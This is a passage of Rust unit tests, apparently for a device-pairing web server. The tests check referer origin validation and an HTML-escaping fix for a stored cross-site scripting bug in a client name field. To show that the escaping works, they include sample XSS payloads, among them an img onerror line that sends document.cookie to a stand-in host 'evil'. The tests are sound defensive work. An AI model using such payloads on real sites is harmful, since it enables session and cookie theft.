        // We only assert that a referer whose scheme/host is NOT the
        // base is rejected, which is the negative-direction sanity
        // check.
        let bad = "https://attacker.example.com/some/path";
        assert_eq!(
            check_origin_or_referer(None, Some(bad)),
            Err(OriginCheckError::NotAllowed),
            "a well-formed but foreign Referer must be rejected"
        );
    }

    // ── A-M4-1: HTML escape for client_name ────────────────────────────
    // The pre-fix `pair_page` `confirmed` branch interpolated the
    // user-supplied `client_name` straight into the response body via
    // `format!`, which let an attacker confirm a pairing with a name
    // like `<img src=x onerror="…">` and have it execute when the
    // success page was later re-rendered on the device base origin
    // (CWE-79). The fix routes the name through `html_escape`. These
    // tests pin the helper and the rendered shape of the success page.

    #[test]
    fn html_escape_replaces_all_five_special_chars() {
        // The OWASP-recommended baseline escapes &, <, >, ", '. Order
        // matters: '&' MUST be replaced first so we don't double-escape
        // the '&' that the entity replacements introduce.
        let input = "<script>alert(\"xss&'\")</script>";
        let escaped = html_escape(input);
        assert_eq!(
            escaped, "&lt;script&gt;alert(&quot;xss&amp;&#39;&quot;)&lt;/script&gt;",
            "all five HTML-special chars must be replaced with named entities"
        );
        assert!(
            !escaped.contains('<') && !escaped.contains('>'),
            "no raw angle brackets must survive"
        );
    }

    #[test]
    fn html_escape_is_a_noop_on_safe_input() {
        // ASCII letters / digits / CJK characters / whitespace must
        // pass through verbatim — the only changes should be for the
        // five special chars.
        for s in ["client", "My Phone 2", "客户端-A", "user_name-1"] {
            assert_eq!(html_escape(s), s, "non-special input must not be altered");
        }
    }

    #[test]
    fn html_escape_preserves_unicode_codepoints() {
        // We escape by `char`, not by byte — multi-byte UTF-8 must not
        // be split or corrupted (defence against UTF-8 boundary bugs).
        let s = "客户端 🔥 <script>";
        let escaped = html_escape(s);
        assert!(escaped.starts_with("客户端 🔥 "));
        assert!(escaped.ends_with("&lt;script&gt;"));
    }

    #[test]
    fn confirmed_pair_page_renders_with_escaped_client_name() {
        // Adversarial payload lifted from the M4 review repro:
        //   <img src=x onerror="fetch('//evil/'+document.cookie)">
        // Pre-fix this would have landed verbatim inside the <strong>
        // and fired onerror when the page was rendered. Post-fix the
        // angle brackets, quotes, and ampersand are entity-encoded —
        // browsers will not parse a tag inside `&lt;…&gt;`.
        let payload = r#"<img src=x onerror="fetch('//evil/'+document.cookie)">"#;
        let escaped = html_escape(payload);

        // The ONLY thing that can land a script in the DOM is a raw
        // HTML tag, i.e. a literal `<` that the parser sees as the
        // start of a tag. After escape there are zero such tags.
        assert!(
            !escaped.contains('<'),
            "escaped client_name must contain no raw '<' (no tag start): {escaped:?}"
        );
        assert!(
            !escaped.contains('>'),
            "escaped client_name must contain no raw '>' (no tag end): {escaped:?}"
        );
        assert!(
            escaped.contains("&lt;img"),
            "rendered form must show the escaped tag, not the raw tag: {escaped}"
        );

        // The success-page body interpolates the escaped name. Confirm
        // the exact body shape (the static template + escaped name).
        let body = format!("<h1>已配对</h1><p>客户端 <strong>{escaped}</strong> 已成功接入。</p>");
        // The only `<` characters in the final body should come from
        // the static template tags (`<h1>`, `</h1>`, `<p>`, `<strong>`,
        // `</strong>`, `</p>` = 6) — none from the user-supplied name.
        let lt_count = body.matches('<').count();
        assert_eq!(
            lt_count, 6,
            "rendered body must contain exactly the 6 '<' from the static template: {body}"
        );
        assert!(
            !body.contains("<img") && !body.contains("<script") && !body.contains("<iframe"),
            "rendered body must not contain a raw injection tag: {body}"
        );
    }

    #[test]
    fn confirmed_pair_page_uses_fallback_when_client_name_missing() {
        // When the session has no client_name we render the literal
        // "client" placeholder; the escape helper must not turn this
        // into an entity. Regression net for the
        // `unwrap_or("client")` branch.
        let name = "client";
        let body = format!(
            "<h1>已配对</h1><p>客户端 <strong>{}</strong> 已成功接入。</p>",
            html_escape(name)
        );
        assert_eq!(
            body,
            "<h1>已配对</h1><p>客户端 <strong>client</strong> 已成功接入。</p>"
        );
    }

    #[test]
    fn confirmed_pair_page_handles_long_adversarial_name() {
        // An attacker could try to inflate the page with a very long
        // name; the escape helper is O(n) and must not panic or stall.
        let payload: String = "A".repeat(4096) + "<script>" + &"B".repeat(4096);
        let escaped = html_escape(&payload);
        assert_eq!(escaped.len(), 4096 + "&lt;script&gt;".len() + 4096);
        assert!(!escaped.contains("<script>"));
        assert!(escaped.contains("&lt;script&gt;"));
    }
}
